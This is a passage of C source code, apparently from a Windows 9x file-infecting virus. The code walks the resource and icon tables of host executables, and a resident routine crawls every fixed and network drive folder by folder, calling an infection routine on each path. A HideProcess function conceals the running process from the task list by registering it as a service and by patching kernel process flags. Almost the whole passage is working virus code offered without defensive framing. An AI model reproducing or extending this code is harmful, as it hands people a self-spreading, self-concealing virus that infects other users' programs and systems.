     pRsrcDirEntry = (PIMAGE_RESOURCE_DIRECTORY_ENTRY)(pRsrcDir + 1);
     nCount = pRsrcDir->NumberOfNamedEntries + pRsrcDir->NumberOfIdEntries;
     do
       pRsrcDirEntry->DataIsDirectory
         ? FixResources(Rva2Ptr(PIMAGE_RESOURCE_DIRECTORY,  //recursion..
                                pRsrcStart,
                                pRsrcDirEntry->OffsetToDirectory))
         : (Rva2Ptr(PIMAGE_RESOURCE_DATA_ENTRY,
                    pRsrcStart,
                    pRsrcDirEntry->OffsetToData)->OffsetToData
              += _RvaDelta);
     while (pRsrcDirEntry++, --nCount);
   }

   #define LARGE_ICON 0
   #define SMALL_ICON 1

   PICONIMAGE GetDefaultIcon(PIMAGE_RESOURCE_DIRECTORY pRsrcDir,
                             BOOLB IconType,
                             BOOLB bFalse) {
     PIMAGE_RESOURCE_DIRECTORY_ENTRY pRsrcDirEntry;
     PIMAGE_RESOURCE_DATA_ENTRY pRsrcDataEntry;
     PICONIMAGE pIconImage;
     DWORD nCount;
     if (!pRsrcDir)
       return NULL;
     pRsrcDirEntry = (PIMAGE_RESOURCE_DIRECTORY_ENTRY)(pRsrcDir + 1);
     nCount = pRsrcDir->NumberOfNamedEntries + pRsrcDir->NumberOfIdEntries;
     do {
       if (!bFalse && pRsrcDirEntry->Id != (WORD)RT_ICON)
         continue;
       if (pRsrcDirEntry->DataIsDirectory) {
         pIconImage = GetDefaultIcon(Rva2Ptr(PIMAGE_RESOURCE_DIRECTORY,
                                             pRsrcStart,
                                             pRsrcDirEntry->OffsetToDirectory),
                                     IconType,
                                     TRUE);
         if (!pIconImage)
           continue;
         return pIconImage;
       }
       pRsrcDataEntry = Rva2Ptr(PIMAGE_RESOURCE_DATA_ENTRY,
                                pRsrcStart,
                                pRsrcDirEntry->OffsetToData);
       pIconImage = Rva2Raw(pRsrcDataEntry->OffsetToData);
       if (pIconImage->icHeader.biSize != sizeof(BITMAPINFOHEADER) ||
           pIconImage->icHeader.biWidth != (IconType == LARGE_ICON
                                              ? 32
                                              : 16) ||
           pIconImage->icHeader.biHeight != (IconType == LARGE_ICON
                                               ? 64
                                               : 32) ||
           pIconImage->icHeader.biPlanes != 1 ||
           pIconImage->icHeader.biBitCount != 4)
         continue;
       return pIconImage;
     } while (++pRsrcDirEntry, --nCount);
     return NULL;
   }

   VOID GetDefaultIcons(PICONIMAGES pIconImages,
                        PVOID pNEorPE) {
     if (((PIMAGE_NT_HEADERS)pNEorPE)->Signature == IMAGE_NT_SIGNATURE) {
       PIMAGE_NT_HEADERS pPE = _pHostPE = (PIMAGE_NT_HEADERS)pNEorPE;
       PIMAGE_RESOURCE_DIRECTORY pRsrcDir =
         pRsrcStart =
           Rva2Raw(pPE->OptionalHeader.
                        DataDirectory[IMAGE_DIRECTORY_ENTRY_RESOURCE].
                        VirtualAddress);
       pIconImages->pLargeIcon = GetDefaultIcon(pRsrcDir, LARGE_ICON, FALSE);
       pIconImages->pSmallIcon = GetDefaultIcon(pRsrcDir, SMALL_ICON, FALSE);
       return;
     }
     if (((PIMAGE_OS2_HEADER)pNEorPE)->ne_magic == IMAGE_OS2_SIGNATURE) {
       PIMAGE_OS2_HEADER pNE = (PIMAGE_OS2_HEADER)pNEorPE;
       BYTE align = *Rva2Ptr(PBYTE, pNE, pNE->ne_rsrctab);
       PRESOURCE_TYPE
         pRsrcType = Rva2Ptr(PRESOURCE_TYPE, pNE, pNE->ne_rsrctab + 2),
         pRsrcEnd = Rva2Ptr(PRESOURCE_TYPE, pNE, pNE->ne_restab);
       while (pRsrcType < pRsrcEnd && pRsrcType->ID) {
         if (pRsrcType->ID == (0x8000 | (WORD)RT_ICON)) {
           PRESOURCE_INFO pRsrcInfo = (PRESOURCE_INFO)(pRsrcType + 1);
           DWORD nCount = 0;
           do {
             PICONIMAGE pIconImage = Rva2Ptr(PICONIMAGE,
                                             pMZ,
                                             pRsrcInfo++->offset << align);
             if (pIconImage->icHeader.biSize == sizeof(BITMAPINFOHEADER) &&
                 pIconImage->icHeader.biPlanes == 1 &&
                 pIconImage->icHeader.biBitCount == 4)
               if (!pIconImages->pLargeIcon &&
                    pIconImage->icHeader.biWidth == 32 &&
                    pIconImage->icHeader.biHeight == 64)
                 pIconImages->pLargeIcon = pIconImage;
               else
               if (!pIconImages->pSmallIcon &&
                    pIconImage->icHeader.biWidth == 16 &&
                    pIconImage->icHeader.biHeight == 32)
                 pIconImages->pSmallIcon = pIconImage;
             if (pIconImages->pLargeIcon && pIconImages->pSmallIcon)
               goto breakall;
           } while (++nCount < pRsrcType->count);
         }
         pRsrcType =
           (PRESOURCE_TYPE)
             ((PBYTE)pRsrcType + sizeof(RESOURCE_TYPE)
                + pRsrcType->count * sizeof(RESOURCE_INFO));
       }
       breakall:;
     }
   }
   #endif

   #ifdef tsr
   __inline VOID SeekTSR() {
     DWORD cBytes;
     PBYTE pszDrvs, pszDrive;
     UINT uDriveType;
     if (!(cBytes = GetLogicalDriveStrings(0, NULL)) ||
         !(pszDrvs = (PBYTE)GlobalAlloc(LPTR, cBytes + 1)))
       return;
     if (GetLogicalDriveStrings(cBytes, pszDrvs) - 1 < cBytes) {
       #if PREV_LAPSE
       Sleep(PREV_LAPSE * 1000);
       #endif
       do {
         pszDrive = pszDrvs;
         do {
           if ((uDriveType = GetDriveType(pszDrive)) <= DRIVE_REMOVABLE ||
               uDriveType == DRIVE_CDROM)
             continue;
           #ifdef msgbox
           if (CancelFolderSeek)
             CancelFolderSeek = FALSE;
           #endif
           WalkFolder(lstrcpy(PathName, pszDrive));
         } while (*(pszDrive += lstrlen(pszDrive) + 1));
         #ifdef msgbox
         if (CancelFolderSeek)
           break;
         #endif
       } while (TRUE);
       #ifdef msgbox
       CloseHandle(hMutex);
       #if 1
       MessageBox(NULL, "TSR: Mutex destroyed!", szCopyright, MB_OK);
       #endif
       #endif
     }
     #ifdef msgbox
     GlobalFree(pszDrvs);
     #endif
   }

   VOID WalkFolder(PBYTE PathName) {
     DWORD cBytes;
     HANDLE hFindFile;
     Sleep(SEEK_LAPSE * 1000);
     InfectPath(PathName, cBytes = lstrlen(PathName));
     if (PathName[cBytes - 1] != '\\')
       PathName[cBytes++] = '\\';
     *(PDWORD)(PathName + cBytes) = '*.*';
     if ((hFindFile = FindFirstFile(PathName, &FindDataTSR)) ==
           INVALID_HANDLE_VALUE)
       return;
     do {
       #ifdef msgbox
       if (CancelFolderSeek)
         break;
       #endif
       if (!IsFolder(&FindDataTSR))
         continue;
       lstrcpy(PathName + cBytes, FindDataTSR.cFileName);
       WalkFolder(PathName);                            //recurse folders..
     } while (FindNextFile(hFindFile, &FindDataTSR));
     FindClose(hFindFile);
   }

   //VOID HideProcess() {                               //Unsecure way to
   //  PTHREAD_DATABASE pThreadDB = GetThreadDB();      //hide our process.
   //  if (pThreadDB->pProcess->Type != K32OBJ_PROCESS) //This is undocumented
   //    return;                                        //Microsoft stuff,
   //  pThreadDB->pProcess->flags |= fServiceProcess;   //likely to GP fault!
   //}                                                  //Code bellow is better

   VOID HideProcess() {
     { //do it the legal undoc. way..
       DWORD (WINAPI *pfnRegisterServiceProcess)(DWORD, DWORD);
       pfnRegisterServiceProcess =
         (DWORD (WINAPI *)(DWORD, DWORD))
           GetProcAddress(GetModuleHandle("KERNEL32"),
                          "RegisterServiceProcess");
       if (pfnRegisterServiceProcess)
         pfnRegisterServiceProcess(0, 1);
     }
     { //do it the ilegal dirty way, just in case..
       PPROCESS_DATABASE pProcessDB = GetProcessDB();
       HANDLE hProcess = GetCurrentProcess();
       DWORD dwBuffer, nBytes;
       if (!ReadProcessMemory(hProcess, &pProcessDB->Type,
                              &dwBuffer, 4, &nBytes) ||
           nBytes != 4 || dwBuffer != K32OBJ_PROCESS ||
           !ReadProcessMemory(hProcess, &pProcessDB->flags,
                              &dwBuffer, 4, &nBytes) ||
           nBytes != 4)
         return;
       dwBuffer |= fServiceProcess;
       WriteProcessMemory(hProcess, &pProcessDB->flags,
                          &dwBuffer, 4, &nBytes);
     }
   }

   __inline PPROCESS_DATABASE GetProcessDB() {
     PPROCESS_DATABASE pProcessDB;
     DWORD nBytes;
     return (!ReadProcessMemory(GetCurrentProcess(), &GetThreadDB()->pProcess,
                                &pProcessDB, 4, &nBytes) ||
             nBytes != 4)
               ? NULL
               : pProcessDB;
   }

   __inline PTHREAD_DATABASE GetThreadDB() {
     __asm push -10h
     __asm pop eax
     __asm add eax,fs:[TIB.ptibSelf + (eax + 10h)]  //(eax + 10h) = 0
   }
   #endif

   //end
